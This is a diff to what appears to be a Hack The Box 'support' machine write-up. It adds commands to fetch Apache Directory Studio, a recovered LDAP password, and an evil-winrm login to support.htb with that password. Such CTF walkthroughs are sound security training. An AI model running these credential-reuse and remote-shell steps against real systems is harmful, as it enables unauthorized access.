@@ -43,3 +43,19 @@ print(res)
 nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
 ```
 ![image](https://github.com/regarmulia/HTB/assets/33616880/2b3ae44c-1a69-4e82-92c3-0ffaac79088c)
+
+
+```
+wget https://dlcdn.apache.org/directory/studio/2.0.0.v20210717-M17/ApacheDirectoryStudio-2.0.0.v20210717-M17-linux.gtk.x86_64.tar.gz
+tar -xf ApacheDirectoryStudio-2.0.0.v20210717-M17-linux.gtk.x86_64.tar.gz
+./ApacheDirectoryStudio
+Ironside47pleasure40Watchful
+```
+![image](https://github.com/regarmulia/HTB/assets/33616880/875c3cc4-807f-429a-8bb9-8b8e08ac724e)
+
+
+```
+evil-winrm -u support -p 'Ironside47pleasure40Watchful' -i support.htb
+```
+![image](https://github.com/regarmulia/HTB/assets/33616880/f0f57e9e-b8fc-4d4d-b8ac-3a129655c56f)
+
